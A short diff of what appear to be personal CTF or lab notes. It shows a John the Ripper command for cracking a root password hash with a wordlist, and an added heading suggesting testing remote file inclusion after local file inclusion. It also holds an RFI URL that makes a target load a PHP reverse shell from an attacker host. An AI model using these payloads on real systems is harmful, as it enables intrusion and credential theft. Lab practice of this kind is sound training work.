@@ -75,6 +75,8 @@ sha512crypt can be bruteforced with John the ripper ($6$ --> root password)
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ______________________________________________________________________________________________________________________________
 
+IF you got LFI just test RFI 
+-----------------------------
 When you paste the payload below in browser, cannot connect the reverse shell.
 http://10.10.56.103/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.52.17/php-reverse-shell.php
 
